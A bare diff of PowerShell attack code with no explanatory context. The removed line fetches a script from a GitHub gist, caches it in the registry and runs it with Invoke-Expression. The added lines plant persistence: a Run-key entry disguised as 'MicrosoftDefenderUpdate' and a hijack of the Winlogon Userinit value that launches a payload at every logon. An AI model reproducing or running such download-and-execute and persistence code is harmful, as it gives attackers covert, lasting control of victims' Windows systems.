@@ -1,1 +1,3 @@
-$url="https://gist.githubusercontent.com/autonomoid/f7cda01e66c119dbbbf1d06700d34452/raw?"+[guid]::NewGuid();$reg="HKCU:\Software\MyApp";if(-not(Test-Path $reg)){New-Item -Path $reg -Force|Out-Null};try{$s=Invoke-WebRequest -Uri $url -UseBasicParsing|Select-Object -ExpandProperty Content;Set-ItemProperty -Path $reg -Name Script -Value $s}catch{$s=(Get-ItemProperty -Path $reg -Name Script).Script};Invoke-Expression $s
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftDefenderUpdate" -Value "C:\Path\To\YourScript.ps1"
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Path\To\YourPayload.exe,"
